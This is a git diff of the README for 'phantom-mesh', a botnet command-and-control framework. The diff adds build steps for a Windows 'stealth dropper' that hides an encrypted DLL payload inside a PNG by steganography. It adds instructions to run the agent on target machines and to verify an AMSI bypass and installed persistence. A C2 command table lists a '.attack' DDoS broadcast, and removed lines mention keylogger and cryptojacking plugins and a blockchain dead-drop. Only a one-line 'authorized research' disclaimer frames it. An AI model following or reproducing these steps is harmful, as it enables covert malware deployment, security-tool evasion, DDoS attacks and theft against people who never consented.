@@ -74,101 +74,70 @@ See [docs/architecture.md](docs/architecture.md) for detailed technical design.
 
 ### Prerequisites
 
-- **Rust** 1.70+ (for Phantom and Edge)
-- **Zig** 0.11+ (for Cloud nodes)
-- **OpenSSL** (for key generation)
+- **Rust** 1.70+ (Phantom C2, Edge Agent)
+- **Zig** 0.11+ (Cloud Nodes)
+- **MinGW-w64** (If cross-compiling for Windows on Linux/Mac)
 
-### 1. Build All Components
+### 1. Build Cloud & C2 (infrastructure)
 
 ```bash
-# Clone repository
-git clone <repo-url> phantom-mesh
-cd phantom-mesh
-
-# Build Cloud node (Zig)
+# Build Cloud Node (Zig)
 make cloud_linux_x64
 
 # Build Phantom C2 (Rust)
 cargo build -p phantom --release
-
-# Build Edge agent (Rust)
-cargo build -p edge --release
 ```
 
-### 2. Generate Master Keys
+### 2. Build Stealth Agent (Windows Target)
+
+The Windows agent requires a multi-stage build to embed the payload via steganography.
 
 ```bash
-mkdir -p keys
-openssl genpkey -algorithm ED25519 -out keys/phantom.pem
-# Or use simple random key:
-openssl rand 32 > keys/phantom_c2.key
+# 1. compile Core Logic as DLL (Payload)
+cargo build -p edge --lib --release --target x86_64-pc-windows-gnu
+
+# 2. Embed DLL into PNG (Steganography)
+# This encrypts target/.../edge.dll and injects it into src/assets/logo.png
+./target/debug/steg_maker_build target/x86_64-pc-windows-gnu/release/edge.dll crates/nodes/edge/src/assets/logo.png
+
+# 3. Compile Dropper EXE (contains the PNG)
+# Only now do we build the final executable
+cargo build -p edge --bin edge --release --target x86_64-pc-windows-gnu --no-default-features
+
+# Resulting Artifact:
+# dist/edge.exe (Stealth Dropper, ~2.6MB)
 ```
 
-### 3. Deploy Cloud Nodes
+**Debug Build**: To enable console logs and IPC, add `--features debug_mode` to the final command.
 
-```bash
-# On each VPS/server:
-./dist/cloud_linux_x64 --port 31337
-```
+### 3. Deploy
 
-Recommended: Deploy 3-5 Cloud nodes for mesh redundancy.
-
-### 4. Start Phantom C2
-
-```bash
-./target/release/phantom --key keys/ --port 12961
-```
-
-### 5. Connect as Operator
-
-```bash
-ssh admin@<phantom-ip> -p 12961
-# Password: (none required with key auth)
-```
+1. **Cloud**: Run `./dist/cloud_linux_x64 --port 31337` on VPS.
+2. **C2**: Run `./target/release/phantom --key keys/ --port 12961`.
+3. **Agent**: Execute `edge.exe` on target Windows machine.
 
 ---
 
 ## Operational Guide
+
+### Verifying Stealth (Debug Mode)
+
+To verify the agent is working without exposing it to EDR:
+1. Build with `--features debug_mode`.
+2. Run `dist/edge_debug.exe`.
+3. Observe logs for:
+    - `[GhostProtocol] ... Complete`: AMSI Bypass success.
+    - `[Persistence] ... Triad`: Persistence installed.
+    - `[C2] ... Tag: ...`: Network connectivity.
 
 ### C2 Shell Commands
 
 | Command | Description | Example |
 |---------|-------------|---------|
 | `help` | List all commands | `help` |
-| `clear` | Clear terminal | `clear` |
-| `.peers` | Show direct P2P neighbors | `.peers` |
-| `.count` | Count total mesh nodes | `.count` |
-| `.attack <ip> <port> <duration>` | Broadcast attack command | `.attack 1.2.3.4 80 60` |
-| `.onchain <ip:port,...>` | Publish C2 addresses to blockchain | `.onchain 1.2.3.4:1883` |
-
-### Edge Deployment
-
-Deploy Edge nodes on target machines. They will:
-
-1. **Bootstrap**: Discover Cloud nodes via 5-tier fallback
-2. **Elect Leader**: LAN nodes vote for strongest leader (UDP broadcast)
-3. **Connect**: Leader connects to Cloud via MQTT; Workers connect to Leader
-4. **Execute**: Receive and execute plugin commands
-
-```bash
-# On target machine:
-./target/release/edge
-```
-
-Edge nodes are fully autonomous—no configuration required.
-
-### Monitoring
-
-Check Phantom logs for mesh status:
-
-```bash
-tail -f /var/log/phantom.log
-```
-
-Key log patterns:
-- `bootstrap: X nodes` — Discovered X Cloud nodes
-- `role: leader` — Edge became LAN leader
-- `peers: X` — Connected to X P2P neighbors
+| `.peers` | Show direct P2P mesh neighbors | `.peers` |
+| `.count` | Estimate total network size | `.count` |
+| `.attack <ip> <port> <duration>` | Broadcast DDoS command | `.attack 1.2.3.4 80 60` |
 
 ---
 
@@ -178,26 +147,10 @@ Key log patterns:
 
 | Direction | Port | Protocol | Purpose |
 |-----------|------|----------|---------|
-| **Inbound** | 31337 | UDP | Cloud P2P mesh |
-| **Inbound** | 12961 | TCP | Phantom SSH (operator only) |
-| **Inbound** | 1883 | TCP | Cloud MQTT (Edge connections) |
-| **LAN Only** | 31338 | UDP | Edge leader election |
-| **LAN Only** | 31339 | TCP | Edge worker-leader bridge |
-
-### Recommended Topology
-
-```
-Internet
-    │
-    ├── Cloud A (VPS 1) ───┐
-    ├── Cloud B (VPS 2) ───┼──► P2P Mesh ◄── Phantom C2
-    └── Cloud C (VPS 3) ───┘         │
-                                     │ MQTT
-                        ┌────────────┴────────────┐
-                        │        LAN 1            │
-                        │   Leader ◄─► Workers    │
-                        └─────────────────────────┘
-```
+| **Inbound** | 31337 | UDP | Cloud P2P Mesh |
+| **Inbound** | 12961 | TCP | Phantom Operator SSH |
+| **Inbound** | 1883 | TCP | Cloud MQTT (Edge Listener) |
+| **Outbound** | 80/443 | TCP | Edge C2 (DoH, Reddit, Fallback) |
 
 ---
 
@@ -207,49 +160,21 @@ Internet
 phantom-mesh/
 ├── crates/
 │   ├── nodes/
-│   │   ├── cloud/          # Mesh relay node (Zig)
-│   │   ├── phantom/        # C2 master node (Rust)
-│   │   │   ├── src/
-│   │   │   │   ├── main.rs         # Entry point
-│   │   │   │   ├── network/        # P2P service
-│   │   │   │   └── ssh/            # Operator shell
-│   │   │   └── Cargo.toml
-│   │   └── edge/           # Target agent (Rust)
-│   │       ├── src/
-│   │       │   ├── main.rs         # Entry point
-│   │       │   ├── core/           # Leader/Worker runtime
-│   │       │   ├── discovery/      # Election + Zero-Noise
-│   │       │   ├── network/        # Cloud connection, Bridge
-│   │       │   └── plugins/        # Plugin loader
-│   │       └── Cargo.toml
-│   ├── plugins/            # Dynamic plugins
-│   │   ├── ddos/           # DDoS module (disabled)
-│   │   ├── cryptojacking/
-│   │   └── keylogger/
-│   └── shared/
-│       ├── protocol/       # Wire protocol definitions
-│       └── plugin_api/     # Plugin FFI interface
-├── smart_contracts/        # Ethereum Sepolia dead-drop
-├── docs/
-│   ├── architecture.md     # Detailed technical design
-│   └── architecture.png    # Network diagram
-├── Makefile                # Build targets
-└── Cargo.toml              # Workspace root
+│   │   ├── cloud/          # Cloud Relay (Zig)
+│   │   ├── phantom/        # C2 Master (Rust)
+│   │   └── edge/           # Stealth Agent (Rust)
+│   │       ├── src/stealth/    # Evasion Engine (Windows/Linux)
+│   │       ├── src/c2/         # Comm Logic
+│   │       └── src/assets/     # Steganography Assets
+│   └── shared/             # Cryptography & Protocol
+├── tools/
+│   └── steg_maker/         # Payload Packer (PNG Injector)
+├── docs/                   # Architecture Documentation
+└── dist/                   # Final Build Artifacts
 ```
 
 ---
 
-## Security Considerations
+## Disclaimer
 
-> [!WARNING]
-> This is research software. Deploying without authorization is illegal.
-
-- **Key Protection**: Guard `keys/` directory. Compromise = full mesh control.
-- **Network Isolation**: Phantom should not be directly internet-exposed. Use VPN.
-- **Log Sanitization**: Production deployments should disable debug logging.
-
----
-
-## License
-
-Proprietary. Unauthorized distribution prohibited.
+**Authorized Research Only**. This software contains advanced evasion techniques (Process Ghosting, AMSI Bypass) designed for red team simulation. Misuse is illegal.
